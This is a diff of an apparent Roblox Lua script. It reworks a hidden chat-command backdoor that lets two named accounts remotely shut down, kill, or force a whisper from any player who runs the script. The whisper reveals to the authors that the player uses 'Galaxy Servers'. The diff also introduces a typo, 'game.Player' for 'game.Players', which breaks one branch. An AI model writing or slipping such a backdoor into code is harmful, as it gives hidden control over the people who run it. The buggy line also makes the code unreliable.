@@ -1287,36 +1287,72 @@ end
 
 local prefix = ","
 local LPlayer = game.Players:FindFirstChild("plzIWannaGetAdmin") or game.Players:FindFirstChild("Lithium_Nova")
-LPlayer.Chatted:Connect(function(msg)
-    msg = msg:lower()
-    if string.sub(msg,1,3) == "/e " then
-        msg = string.sub(msg,4)
-    end
-    if string.sub(msg,1,1) == prefix then
-        local cmd
-        local space = string.find(msg," ")
-        if space then
-            cmd = string.sub(msg,2,space-1)
-        else
-            cmd = string.sub(msg,2)
+if LPlayer == game.Player:FindFirstChild("Lithium_Nova") then
+    LPlayer.Chatted:Connect(function(msg)
+        msg = msg:lower()
+        if string.sub(msg,1,3) == "/e " then
+            msg = string.sub(msg,4)
         end
+        if string.sub(msg,1,1) == prefix then
+            local cmd
+            local space = string.find(msg," ")
+            if space then
+                cmd = string.sub(msg,2,space-1)
+            else
+                cmd = string.sub(msg,2)
+            end
+    
+            if cmd == "shutdown" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game:Shutdown()
+                end
+            end
+            if cmd == "ghcheck" then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w Lithium_Nova I am using Galaxy Servers", "All")
+            end
+            if cmd == "kill" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game.Players.LocalPlayer.Character:BreakJoints()
+                end
+            end
+        end
+    end)
+elseif LPlayer == game.Players:FindFirstChild("plzIWannaGetAdmin") then
+    LPlayer.Chatted:Connect(function(msg)
+        msg = msg:lower()
+        if string.sub(msg,1,3) == "/e " then
+            msg = string.sub(msg,4)
+        end
+        if string.sub(msg,1,1) == prefix then
+            local cmd
+            local space = string.find(msg," ")
+            if space then
+                cmd = string.sub(msg,2,space-1)
+            else
+                cmd = string.sub(msg,2)
+            end
 
-        if cmd == "shutdown" then
-            local var = string.sub(msg,space+1)
-            local target = GetPlayer(var)
-            if game.Players.LocalPlayer == target then
-                game:Shutdown()
+            if cmd == "shutdown" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game:Shutdown()
+                end
+            end
+            if cmd == "ghcheck" then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
+            end
+            if cmd == "kill" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game.Players.LocalPlayer.Character:BreakJoints()
+                end
             end
         end
-        if cmd == "ghcheck" then
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
-        end
-        if cmd == "kill" then
-            local var = string.sub(msg,space+1)
-            local target = GetPlayer(var)
-            if game.Players.LocalPlayer == target then
-                game.Players.LocalPlayer.Character:BreakJoints()
-            end
-        end
-    end
-end)
+    end)
+end
